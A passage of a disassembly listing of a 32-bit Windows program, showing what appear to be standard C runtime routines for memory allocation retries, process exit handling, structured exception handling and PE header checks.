loc_412B21:                             ; CODE XREF: sub_412959+1AB↑j
                                        ; sub_412959+1BD↑j
                call    sub_41090E
                test    byte ptr [ebp+arg_10], 1
                mov     dword ptr [eax], 22h
                jz      short loc_412B38
                or      [ebp+var_4], 0FFFFFFFFh
                jmp     short loc_412B47
; ---------------------------------------------------------------------------

loc_412B38:                             ; CODE XREF: sub_412959+1D7↑j
                test    byte ptr [ebp+arg_10], 2
                push    0
                pop     eax
                setnz   al
                add     eax, esi
                mov     [ebp+var_4], eax

loc_412B47:                             ; CODE XREF: sub_412959+191↑j
                                        ; sub_412959+1AF↑j ...
                mov     eax, [ebp+arg_8]
                test    eax, eax
                jz      short loc_412B50
                mov     [eax], edi

loc_412B50:                             ; CODE XREF: sub_412959+1F3↑j
                test    byte ptr [ebp+arg_10], 2
                jz      short loc_412B59
                neg     [ebp+var_4]

loc_412B59:                             ; CODE XREF: sub_412959+1FB↑j
                cmp     [ebp+var_8], 0
                jz      short loc_412B66
                mov     eax, [ebp+var_C]
                and     dword ptr [eax+70h], 0FFFFFFFDh

loc_412B66:                             ; CODE XREF: sub_412959+204↑j
                mov     eax, [ebp+var_4]
                jmp     short loc_412B83
; ---------------------------------------------------------------------------

loc_412B6B:                             ; CODE XREF: sub_412959+C1↑j
                                        ; sub_412959+CA↑j ...
                mov     eax, [ebp+arg_8]
                test    eax, eax
                jz      short loc_412B74
                mov     [eax], esi

loc_412B74:                             ; CODE XREF: sub_412959+217↑j
                cmp     [ebp+var_8], 0
                jz      short loc_412B81
                mov     eax, [ebp+var_C]
                and     dword ptr [eax+70h], 0FFFFFFFDh

loc_412B81:                             ; CODE XREF: sub_412959+21F↑j
                xor     eax, eax

loc_412B83:                             ; CODE XREF: sub_412959+210↑j
                pop     ebx

loc_412B84:                             ; CODE XREF: sub_412959+4E↑j
                pop     edi
                pop     esi
                leave
                retn
sub_412959      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_412B88      proc near               ; CODE XREF: sub_40E80D+C↑p

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                xor     eax, eax
                push    eax
                push    [ebp+arg_8]
                push    [ebp+arg_4]
                push    [ebp+arg_0]
                cmp     dword_42AE20, eax
                jnz     short loc_412BA8
                push    offset off_4257D0
                jmp     short loc_412BA9
; ---------------------------------------------------------------------------

loc_412BA8:                             ; CODE XREF: sub_412B88+17↑j
                push    eax

loc_412BA9:                             ; CODE XREF: sub_412B88+1E↑j
                call    sub_412959
                add     esp, 14h
                pop     ebp
                retn
sub_412B88      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_412BB3      proc near               ; CODE XREF: sub_410B61+6D2↑p
                                        ; sub_411C24+3B↑p ...

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    esi
                push    edi
                xor     esi, esi

loc_412BBC:                             ; CODE XREF: sub_412BB3+3D↓j
                push    [ebp+arg_0]
                call    sub_40FE32
                mov     edi, eax
                pop     ecx
                test    edi, edi
                jnz     short loc_412BF2
                cmp     dword_42AE54, eax
                jbe     short loc_412BF2
                push    esi             ; dwMilliseconds
                call    ds:Sleep
                lea     eax, [esi+3E8h]
                cmp     eax, dword_42AE54
                jbe     short loc_412BEB
                or      eax, 0FFFFFFFFh

loc_412BEB:                             ; CODE XREF: sub_412BB3+33↑j
                mov     esi, eax
                cmp     eax, 0FFFFFFFFh
                jnz     short loc_412BBC

loc_412BF2:                             ; CODE XREF: sub_412BB3+16↑j
                                        ; sub_412BB3+1E↑j
                mov     eax, edi
                pop     edi
                pop     esi
                pop     ebp
                retn
sub_412BB3      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_412BF8      proc near               ; CODE XREF: .text:0040E8EF↑p
                                        ; sub_40EA6D+3D↑p ...

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    esi
                push    edi
                xor     esi, esi

loc_412C01:                             ; CODE XREF: sub_412BF8+44↓j
                push    0
                push    [ebp+arg_4]
                push    [ebp+arg_0]
                call    sub_419944
                mov     edi, eax
                add     esp, 0Ch
                test    edi, edi
                jnz     short loc_412C3E
                cmp     dword_42AE54, eax
                jbe     short loc_412C3E
                push    esi             ; dwMilliseconds
                call    ds:Sleep
                lea     eax, [esi+3E8h]
                cmp     eax, dword_42AE54
                jbe     short loc_412C37
                or      eax, 0FFFFFFFFh

loc_412C37:                             ; CODE XREF: sub_412BF8+3A↑j
                mov     esi, eax
                cmp     eax, 0FFFFFFFFh
                jnz     short loc_412C01

loc_412C3E:                             ; CODE XREF: sub_412BF8+1D↑j
                                        ; sub_412BF8+25↑j
                mov     eax, edi
                pop     edi
                pop     esi
                pop     ebp
                retn
sub_412BF8      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_412C44(LPVOID lpMem, SIZE_T dwBytes)
sub_412C44      proc near               ; CODE XREF: sub_40E82E+61↑p
                                        ; sub_40E82E+77↑p

lpMem           = dword ptr  8
dwBytes         = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    esi
                push    edi
                xor     esi, esi

loc_412C4D:                             ; CODE XREF: sub_412C44+46↓j
                push    [ebp+dwBytes]   ; dwBytes
                push    [ebp+lpMem]     ; lpMem
                call    sub_40FEFC
                mov     edi, eax
                pop     ecx
                pop     ecx
                test    edi, edi
                jnz     short loc_412C8C
                cmp     [ebp+dwBytes], eax
                jz      short loc_412C8C
                cmp     dword_42AE54, eax
                jbe     short loc_412C8C
                push    esi             ; dwMilliseconds
                call    ds:Sleep
                lea     eax, [esi+3E8h]
                cmp     eax, dword_42AE54
                jbe     short loc_412C85
                or      eax, 0FFFFFFFFh

loc_412C85:                             ; CODE XREF: sub_412C44+3C↑j
                mov     esi, eax
                cmp     eax, 0FFFFFFFFh
                jnz     short loc_412C4D

loc_412C8C:                             ; CODE XREF: sub_412C44+1A↑j
                                        ; sub_412C44+1F↑j ...
                mov     eax, edi
                pop     edi
                pop     esi
                pop     ebp
                retn
sub_412C44      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_412C92(LPCVOID lpMem)
sub_412C92      proc near               ; CODE XREF: sub_40E82E+3D↑p

var_20          = dword ptr -20h
var_1C          = dword ptr -1Ch
ms_exc          = CPPEH_RECORD ptr -18h
lpMem           = dword ptr  8

                push    10h
                push    offset stru_422E38
                call    __SEH_prolog4
                xor     eax, eax
                mov     ebx, [ebp+lpMem]
                xor     edi, edi
                cmp     ebx, edi
                setnz   al
                cmp     eax, edi
                jnz     short loc_412CCB
                call    sub_41090E
                mov     dword ptr [eax], 16h
                push    edi
                push    edi
                push    edi
                push    edi
                push    edi
                call    sub_40EC54
                add     esp, 14h
                or      eax, 0FFFFFFFFh
                jmp     short loc_412D1E
; ---------------------------------------------------------------------------

loc_412CCB:                             ; CODE XREF: sub_412C92+1A↑j
                cmp     dword_42C9E8, 3
                jnz     short loc_412D0C
                push    4
                call    sub_416913
                pop     ecx
                mov     [ebp+ms_exc.registration.TryLevel], edi
                push    ebx
                call    sub_416946
                pop     ecx
                mov     [ebp+var_20], eax
                cmp     eax, edi
                jz      short loc_412CF8
                mov     esi, [ebx-4]
                sub     esi, 9
                mov     [ebp+var_1C], esi
                jmp     short loc_412CFB
; ---------------------------------------------------------------------------

loc_412CF8:                             ; CODE XREF: sub_412C92+59↑j
                mov     esi, [ebp+var_1C]

loc_412CFB:                             ; CODE XREF: sub_412C92+64↑j
                mov     [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh
                call    loc_412D2C
; ---------------------------------------------------------------------------

loc_412D07:                             ; CODE XREF: sub_412C92+A2↓j
                cmp     [ebp+var_20], edi
                jnz     short loc_412D1C

loc_412D0C:                             ; CODE XREF: sub_412C92+40↑j
                push    ebx             ; lpMem
                push    edi             ; dwFlags
                push    hHeap           ; hHeap
                call    ds:HeapSize
                mov     esi, eax

loc_412D1C:                             ; CODE XREF: sub_412C92+78↑j
                mov     eax, esi

loc_412D1E:                             ; CODE XREF: sub_412C92+37↑j
                call    __SEH_epilog4
                retn
; ---------------------------------------------------------------------------

loc_412D24:                             ; DATA XREF: .rdata:stru_422E38↓o
                xor     edi, edi
                mov     ebx, [ebp+lpMem]
                mov     esi, [ebp+var_1C]

loc_412D2C:                             ; CODE XREF: sub_412C92+70↑j
                push    4
                call    sub_416839
                pop     ecx
                retn
sub_412C92      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_412D35(LPCWSTR lpModuleName)
sub_412D35      proc near               ; CODE XREF: sub_412101+4A↑p
                                        ; sub_41217C+4A↑p ...

lpModuleName    = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    edi
                mov     edi, 3E8h

loc_412D40:                             ; CODE XREF: sub_412D35+2B↓j
                push    edi             ; dwMilliseconds
                call    ds:Sleep
                push    [ebp+lpModuleName] ; lpModuleName
                call    ds:GetModuleHandleW
                add     edi, 3E8h
                cmp     edi, 0EA60h
                ja      short loc_412D62
                test    eax, eax
                jz      short loc_412D40

loc_412D62:                             ; CODE XREF: sub_412D35+27↑j
                pop     edi
                pop     ebp
                retn
sub_412D35      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_412D65      proc near               ; CODE XREF: start-C3↑p
                                        ; start-9D↑p ...

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                call    sub_4175B5
                push    [ebp+arg_0]
                call    sub_41740A
                push    off_4257E0
                call    sub_41217C
                push    0FFh
                call    eax
                add     esp, 0Ch
                pop     ebp
                retn
sub_412D65      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_412D8E      proc near               ; CODE XREF: sub_412DB9+8↓p

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    offset aMscoreeDll ; "mscoree.dll"
                call    ds:GetModuleHandleW
                test    eax, eax
                jz      short loc_412DB7
                push    offset aCorexitprocess ; "CorExitProcess"
                push    eax             ; hModule
                call    ds:GetProcAddress
                test    eax, eax
                jz      short loc_412DB7
                push    [ebp+arg_0]
                call    eax

loc_412DB7:                             ; CODE XREF: sub_412D8E+12↑j
                                        ; sub_412D8E+22↑j
                pop     ebp
                retn
sub_412D8E      endp


; =============== S U B R O U T I N E =======================================

; Attributes: noreturn bp-based frame

; void __cdecl __noreturn sub_412DB9(UINT uExitCode)
sub_412DB9      proc near               ; CODE XREF: sub_40FE32+34↑p
                                        ; sub_410117+20↑p ...

uExitCode       = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    [ebp+uExitCode]
                call    sub_412D8E
                pop     ecx
                push    [ebp+uExitCode] ; uExitCode
                call    ds:ExitProcess
sub_412DB9      endp

; ---------------------------------------------------------------------------
                db 0CCh

; =============== S U B R O U T I N E =======================================


sub_412DD1      proc near               ; CODE XREF: sub_40E919+C↑p
                push    8
                call    sub_416913
                pop     ecx
                retn
sub_412DD1      endp


; =============== S U B R O U T I N E =======================================


sub_412DDA      proc near               ; CODE XREF: sub_40E919:loc_40E94F↑p
                push    8
                call    sub_416839
                pop     ecx
                retn
sub_412DDA      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_412DE3      proc near               ; CODE XREF: sub_412E24+57↓p
                                        ; sub_412EA9+D6↓p ...

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    esi
                mov     esi, eax
                jmp     short loc_412DF8
; ---------------------------------------------------------------------------

loc_412DED:                             ; CODE XREF: sub_412DE3+18↓j
                mov     eax, [esi]
                test    eax, eax
                jz      short loc_412DF5
                call    eax

loc_412DF5:                             ; CODE XREF: sub_412DE3+E↑j
                add     esi, 4

loc_412DF8:                             ; CODE XREF: sub_412DE3+8↑j
                cmp     esi, [ebp+arg_0]
                jb      short loc_412DED
                pop     esi
                pop     ebp
                retn
sub_412DE3      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_412E00      proc near               ; CODE XREF: sub_412E24+36↓p

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    esi
                mov     esi, [ebp+arg_0]
                xor     eax, eax
                jmp     short loc_412E1C
; ---------------------------------------------------------------------------

loc_412E0D:                             ; CODE XREF: sub_412E00+1F↓j
                test    eax, eax
                jnz     short loc_412E21
                mov     ecx, [esi]
                test    ecx, ecx
                jz      short loc_412E19
                call    ecx

loc_412E19:                             ; CODE XREF: sub_412E00+15↑j
                add     esi, 4

loc_412E1C:                             ; CODE XREF: sub_412E00+B↑j
                cmp     esi, [ebp+arg_4]
                jb      short loc_412E0D

loc_412E21:                             ; CODE XREF: sub_412E00+F↑j
                pop     esi
                pop     ebp
                retn
sub_412E00      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_412E24      proc near               ; CODE XREF: start-84↑p

var_4           = dword ptr -4
arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                cmp     ds:off_420528, 0
                jz      short loc_412E4B
                push    offset off_420528
                call    sub_4132F0
                pop     ecx
                test    eax, eax
                jz      short loc_412E4B
                push    [ebp+arg_0]
                call    ds:off_420528
                pop     ecx

loc_412E4B:                             ; CODE XREF: sub_412E24+C↑j
                                        ; sub_412E24+1B↑j
                call    sub_418B77
                push    offset unk_420218
                push    offset unk_420200
                call    sub_412E00
                pop     ecx
                pop     ecx
                test    eax, eax
                jnz     short loc_412EA7
                push    offset byte_417ACE
                call    sub_40E955
                mov     eax, offset unk_4201EC
                mov     [esp+4+var_4], offset unk_4201FC
                call    sub_412DE3
                cmp     dword_42DB38, 0
                pop     ecx
                jz      short loc_412EA5
                push    offset dword_42DB38
                call    sub_4132F0
                pop     ecx
                test    eax, eax
                jz      short loc_412EA5
                push    0
                push    2
                push    0
                call    dword_42DB38

loc_412EA5:                             ; CODE XREF: sub_412E24+64↑j
                                        ; sub_412E24+73↑j
                xor     eax, eax

loc_412EA7:                             ; CODE XREF: sub_412E24+3F↑j
                pop     ebp
                retn
sub_412E24      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_412EA9(UINT uExitCode, int, int)
sub_412EA9      proc near               ; CODE XREF: sub_412FD5+C↓p
                                        ; sub_412FEB+C↓p ...

var_28          = dword ptr -28h
var_24          = dword ptr -24h
var_20          = dword ptr -20h
var_1C          = dword ptr -1Ch
ms_exc          = CPPEH_RECORD ptr -18h
uExitCode       = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h

                push    18h
                push    offset stru_422E58
                call    __SEH_prolog4
                push    8
                call    sub_416913
                pop     ecx
                and     [ebp+ms_exc.registration.TryLevel], 0
                xor     ebx, ebx
                inc     ebx
                cmp     dword_42AE88, ebx
                jz      loc_412F95
                mov     dword_42AE84, ebx
                mov     al, byte ptr [ebp+arg_8]
                mov     byte_42AE80, al
                cmp     [ebp+arg_4], 0
                jnz     loc_412F85
                push    dword_42DB30
                call    sub_41217C
                pop     ecx
                mov     edi, eax
                mov     [ebp+var_28], edi
                test    edi, edi
                jz      short loc_412F75
                push    dword_42DB2C
                call    sub_41217C
                pop     ecx
                mov     esi, eax
                mov     [ebp+var_24], esi
                mov     [ebp+var_1C], edi
                mov     [ebp+var_20], esi

loc_412F14:                             ; CODE XREF: sub_412EA9+7C↓j
                                        ; sub_412EA9+CA↓j
                sub     esi, 4
                mov     [ebp+var_24], esi
                cmp     esi, edi
                jb      short loc_412F75
                call    sub_412173
                cmp     [esi], eax
                jz      short loc_412F14
                cmp     esi, edi
                jb      short loc_412F75
                push    dword ptr [esi]
                call    sub_41217C
                mov     edi, eax
                call    sub_412173
                mov     [esi], eax
                call    edi
                push    dword_42DB30
                call    sub_41217C
                mov     edi, eax
                push    dword_42DB2C
                call    sub_41217C
                add     esp, 0Ch
                cmp     [ebp+var_1C], edi
                jnz     short loc_412F62
                cmp     [ebp+var_20], eax
                jz      short loc_412F70

loc_412F62:                             ; CODE XREF: sub_412EA9+B2↑j
                mov     [ebp+var_1C], edi
                mov     [ebp+var_28], edi
                mov     [ebp+var_20], eax
                mov     esi, eax
                mov     [ebp+var_24], esi

loc_412F70:                             ; CODE XREF: sub_412EA9+B7↑j
                mov     edi, [ebp+var_28]
                jmp     short loc_412F14
; ---------------------------------------------------------------------------

loc_412F75:                             ; CODE XREF: sub_412EA9+52↑j
                                        ; sub_412EA9+73↑j ...
                push    offset unk_420228
                mov     eax, offset unk_42021C
                call    sub_412DE3
                pop     ecx

loc_412F85:                             ; CODE XREF: sub_412EA9+39↑j
                push    offset unk_420230
                mov     eax, offset unk_42022C
                call    sub_412DE3
                pop     ecx

loc_412F95:                             ; CODE XREF: sub_412EA9+21↑j
                mov     [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh
                call    loc_412FC0
; ---------------------------------------------------------------------------

loc_412FA1:                             ; CODE XREF: sub_412EA9:loc_412FCE↓j
                cmp     [ebp+arg_8], 0
                jnz     short loc_412FCF
                mov     dword_42AE88, ebx
                push    8
                call    sub_416839
                pop     ecx
                push    [ebp+uExitCode] ; uExitCode
                call    sub_412DB9
; ---------------------------------------------------------------------------

loc_412FBD:                             ; DATA XREF: .rdata:stru_422E58↓o
                xor     ebx, ebx
                inc     ebx

loc_412FC0:                             ; CODE XREF: sub_412EA9+F3↑j
                cmp     [ebp+arg_8], 0
                jz      short loc_412FCE
                push    8
                call    sub_416839
                pop     ecx

loc_412FCE:                             ; CODE XREF: sub_412EA9+11B↑j
                retn
; ---------------------------------------------------------------------------

loc_412FCF:                             ; CODE XREF: sub_412EA9+FC↑j
                call    __SEH_epilog4
                retn
sub_412EA9      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_412FD5(UINT uExitCode)
sub_412FD5      proc near               ; CODE XREF: start-4A↑p

uExitCode       = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    0               ; int
                push    0               ; int
                push    [ebp+uExitCode] ; uExitCode
                call    sub_412EA9
                add     esp, 0Ch
                pop     ebp
                retn
sub_412FD5      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_412FEB(UINT uExitCode)
sub_412FEB      proc near               ; CODE XREF: sub_40E9A9+3B↑p
                                        ; sub_410268+10↑p ...

uExitCode       = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    0               ; int
                push    1               ; int
                push    [ebp+uExitCode] ; uExitCode
                call    sub_412EA9
                add     esp, 0Ch
                pop     ebp
                retn
sub_412FEB      endp


; =============== S U B R O U T I N E =======================================


sub_413001      proc near               ; CODE XREF: start:loc_41024D↑p
                push    1               ; int
                push    0               ; int
                push    0               ; uExitCode
                call    sub_412EA9
                add     esp, 0Ch
                retn
sub_413001      endp


; =============== S U B R O U T I N E =======================================


sub_413010      proc near               ; CODE XREF: sub_410268:loc_41027D↑p
                push    1               ; int
                push    1               ; int
                push    0               ; uExitCode
                call    sub_412EA9
                add     esp, 0Ch
                retn
sub_413010      endp


; =============== S U B R O U T I N E =======================================


sub_41301F      proc near               ; CODE XREF: sub_4125BC+CD↑p
                mov     edi, edi
                push    esi
                call    sub_412173
                mov     esi, eax
                push    esi
                call    sub_416128
                push    esi
                call    sub_419C92
                push    esi
                call    sub_40EB1D
                push    esi
                call    sub_419C83
                push    esi
                call    sub_419C74
                push    esi
                call    sub_419A62
                push    esi
                call    nullsub_1
                push    esi
                call    sub_4188C7
                push    offset sub_412FEB
                call    sub_412101
                add     esp, 24h
                mov     off_4257E0, eax
                pop     esi
                retn
sub_41301F      endp

; ---------------------------------------------------------------------------
                align 10h
; [00000045 BYTES: COLLAPSED FUNCTION __SEH_prolog4. PRESS CTRL-NUMPAD+ TO EXPAND]
; [00000014 BYTES: COLLAPSED FUNCTION __SEH_epilog4. PRESS CTRL-NUMPAD+ TO EXPAND]
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

; int __cdecl SEH_40DB70(int, PVOID TargetFrame, int)
SEH_40DB70      proc near               ; DATA XREF: sub_40DB70+A↑o
                                        ; __SEH_prolog4↑o ...

var_18          = dword ptr -18h
var_14          = dword ptr -14h
var_10          = dword ptr -10h
var_C           = dword ptr -0Ch
var_8           = dword ptr -8
var_1           = byte ptr -1
arg_0           = dword ptr  8
TargetFrame     = dword ptr  0Ch
arg_8           = dword ptr  10h

SEH_4132F0:
                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 18h
                push    ebx
                mov     ebx, [ebp+TargetFrame]
                push    esi
                mov     esi, [ebx+8]
                xor     esi, ___security_cookie
                push    edi
                mov     eax, [esi]
                mov     [ebp+var_1], 0
                mov     [ebp+var_C], 1
                lea     edi, [ebx+10h]
                cmp     eax, 0FFFFFFFEh
                jz      short loc_413109
                mov     ecx, [esi+4]
                add     ecx, edi
                xor     ecx, [eax+edi]
                call    @__security_check_cookie@4 ; __security_check_cookie(x)

loc_413109:                             ; CODE XREF: SEH_4132F0+2A↑j
                mov     ecx, [esi+0Ch]
                mov     eax, [esi+8]
                add     ecx, edi
                xor     ecx, [eax+edi]
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                mov     eax, [ebp+arg_0]
                test    byte ptr [eax+4], 66h
                jnz     loc_41323C
                mov     ecx, [ebp+arg_8]
                lea     edx, [ebp+var_18]
                mov     [ebx-4], edx
                mov     ebx, [ebx+0Ch]
                mov     [ebp+var_18], eax
                mov     [ebp+var_14], ecx
                cmp     ebx, 0FFFFFFFEh
                jz      short loc_41319C
                lea     ecx, [ecx+0]

loc_413140:                             ; CODE XREF: SEH_4132F0+A0↓j
                lea     eax, [ebx+ebx*2]
                mov     ecx, [esi+eax*4+14h]
                lea     eax, [esi+eax*4+10h]
                mov     [ebp+var_10], eax
                mov     eax, [eax]
                mov     [ebp+var_8], eax
                test    ecx, ecx
                jz      short loc_41316B
                mov     edx, edi
                call    sub_413C42
                mov     [ebp+var_1], 1
                test    eax, eax
                jl      short loc_4131A6
                jg      short loc_4131AF
                mov     eax, [ebp+var_8]

loc_41316B:                             ; CODE XREF: SEH_4132F0+85↑j
                mov     ebx, eax
                cmp     eax, 0FFFFFFFEh
                jnz     short loc_413140
                cmp     [ebp+var_1], 0
                jz      short loc_41319C

loc_413178:                             ; CODE XREF: SEH_4132F0+DD↓j
                                        ; SEH_4132F0+187↓j
                mov     eax, [esi]
                cmp     eax, 0FFFFFFFEh
                jz      short loc_41318C
                mov     ecx, [esi+4]
                add     ecx, edi
                xor     ecx, [eax+edi]
                call    @__security_check_cookie@4 ; __security_check_cookie(x)

loc_41318C:                             ; CODE XREF: SEH_4132F0+AD↑j
                mov     ecx, [esi+0Ch]
                mov     edx, [esi+8]
                add     ecx, edi
                xor     ecx, [edx+edi]
                call    @__security_check_cookie@4 ; __security_check_cookie(x)

loc_41319C:                             ; CODE XREF: SEH_4132F0+6B↑j
                                        ; SEH_4132F0+A6↑j ...
                mov     eax, [ebp+var_C]
                pop     edi
                pop     esi
                pop     ebx
                mov     esp, ebp
                pop     ebp
                retn
; ---------------------------------------------------------------------------

loc_4131A6:                             ; CODE XREF: SEH_4132F0+94↑j
                mov     [ebp+var_C], 0
                jmp     short loc_413178
; ---------------------------------------------------------------------------

loc_4131AF:                             ; CODE XREF: SEH_4132F0+96↑j
                mov     ecx, [ebp+arg_0]
                cmp     dword ptr [ecx], 0E06D7363h
                jnz     short loc_4131E3
                cmp     ds:off_420AF4, 0
                jz      short loc_4131E3
                push    offset off_420AF4
                call    sub_4132F0
                add     esp, 4
                test    eax, eax
                jz      short loc_4131E3
                mov     edx, [ebp+arg_0]
                push    1
                push    edx
                call    ds:off_420AF4
                add     esp, 8

loc_4131E3:                             ; CODE XREF: SEH_4132F0+E8↑j
                                        ; SEH_4132F0+F1↑j ...
                mov     ecx, [ebp+TargetFrame] ; TargetFrame
                call    sub_413C72
                mov     eax, [ebp+TargetFrame]
                cmp     [eax+0Ch], ebx
                jz      short loc_413205
                push    offset ___security_cookie
                push    edi
                mov     edx, ebx
                mov     ecx, eax
                call    sub_413C8C
                mov     eax, [ebp+TargetFrame]

loc_413205:                             ; CODE XREF: SEH_4132F0+121↑j
                mov     ecx, [ebp+var_8]
                mov     [eax+0Ch], ecx
                mov     eax, [esi]
                cmp     eax, 0FFFFFFFEh
                jz      short loc_41321F
                mov     ecx, [esi+4]
                add     ecx, edi
                xor     ecx, [eax+edi]
                call    @__security_check_cookie@4 ; __security_check_cookie(x)

loc_41321F:                             ; CODE XREF: SEH_4132F0+140↑j
                mov     ecx, [esi+0Ch]
                mov     edx, [esi+8]
                add     ecx, edi
                xor     ecx, [edx+edi]
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                mov     eax, [ebp+var_10]
                mov     ecx, [eax+8]
                mov     edx, edi
                call    sub_413C59

loc_41323C:                             ; CODE XREF: SEH_4132F0+50↑j
                mov     edx, 0FFFFFFFEh
                cmp     [ebx+0Ch], edx
                jz      loc_41319C
                push    offset ___security_cookie
                push    edi
                mov     ecx, ebx
                call    sub_413C8C
                jmp     loc_413178
SEH_40DB70      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_413260      proc near               ; CODE XREF: sub_4132F0+41↓p

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     ecx, [ebp+arg_0]
                mov     eax, 5A4Dh
                cmp     [ecx], ax
                jz      short loc_413276

loc_413272:                             ; CODE XREF: sub_413260+21↓j
                xor     eax, eax
                pop     ebp
                retn
; ---------------------------------------------------------------------------

loc_413276:                             ; CODE XREF: sub_413260+10↑j
                mov     eax, [ecx+3Ch]
                add     eax, ecx
                cmp     dword ptr [eax], 4550h
                jnz     short loc_413272
                xor     edx, edx
                mov     ecx, 10Bh
                cmp     [eax+18h], cx
                setz    dl
                mov     eax, edx
                pop     ebp
                retn
sub_413260      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_4132A0      proc near               ; CODE XREF: sub_4132F0+5B↓p

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     eax, [ebp+arg_0]
                mov     ecx, [eax+3Ch]
                add     ecx, eax
                movzx   eax, word ptr [ecx+14h]
                push    ebx
                push    esi
                movzx   esi, word ptr [ecx+6]
                xor     edx, edx
                push    edi
                lea     eax, [eax+ecx+18h]
                test    esi, esi
                jbe     short loc_4132DD
                mov     edi, [ebp+arg_4]

loc_4132C5:                             ; CODE XREF: sub_4132A0+3B↓j
                mov     ecx, [eax+0Ch]
                cmp     edi, ecx
                jb      short loc_4132D5
                mov     ebx, [eax+8]
                add     ebx, ecx
                cmp     edi, ebx
                jb      short loc_4132DF

loc_4132D5:                             ; CODE XREF: sub_4132A0+2A↑j
                inc     edx
                add     eax, 28h
                cmp     edx, esi
                jb      short loc_4132C5

loc_4132DD:                             ; CODE XREF: sub_4132A0+20↑j
                xor     eax, eax

loc_4132DF:                             ; CODE XREF: sub_4132A0+33↑j
                pop     edi
                pop     esi
                pop     ebx
                pop     ebp
                retn
sub_4132A0      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_4132F0      proc near               ; CODE XREF: sub_40E96C+13↑p
                                        ; StartAddress+6D↑p ...

ms_exc          = CPPEH_RECORD ptr -18h
arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    0FFFFFFFEh
                push    offset stru_422E78
                push    offset SEH_40DB70
                mov     eax, large fs:0
                push    eax
                sub     esp, 8
                push    ebx
                push    esi
                push    edi
                mov     eax, ___security_cookie
                xor     [ebp+ms_exc.registration.ScopeTable], eax
                xor     eax, ebp
                push    eax
                lea     eax, [ebp+ms_exc.registration]
                mov     large fs:0, eax
                mov     [ebp+ms_exc.old_esp], esp
                mov     [ebp+ms_exc.registration.TryLevel], 0
                push    400000h
                call    sub_413260
                add     esp, 4
                test    eax, eax
                jz      short loc_413392
                mov     eax, [ebp+arg_0]
                sub     eax, 400000h
                push    eax
                push    400000h
                call    sub_4132A0
                add     esp, 8
                test    eax, eax
                jz      short loc_413392
                mov     eax, [eax+24h]
                shr     eax, 1Fh
                not     eax
                and     eax, 1
                mov     [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh
                mov     ecx, [ebp+ms_exc.registration.Next]
                mov     large fs:0, ecx
                pop     ecx
                pop     edi
                pop     esi
                pop     ebx
                mov     esp, ebp
                pop     ebp
                retn
; ---------------------------------------------------------------------------

loc_41337B:                             ; DATA XREF: .rdata:stru_422E78↓o
                mov     eax, [ebp+ms_exc.exc_ptr]
                mov     ecx, [eax]
                mov     eax, [ecx]
                xor     edx, edx
                cmp     eax, 0C0000005h
                setz    dl
                mov     eax, edx
                retn
; ---------------------------------------------------------------------------

loc_41338F:                             ; DATA XREF: .rdata:stru_422E78↓o
                mov     esp, [ebp+ms_exc.old_esp]

loc_413392:                             ; CODE XREF: sub_4132F0+4B↑j
                                        ; sub_4132F0+65↑j
                mov     [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh
                xor     eax, eax
                mov     ecx, [ebp+ms_exc.registration.Next]
                mov     large fs:0, ecx
                pop     ecx
                pop     edi
                pop     esi
                pop     ebx
                mov     esp, ebp
                pop     ebp
                retn
sub_4132F0      endp


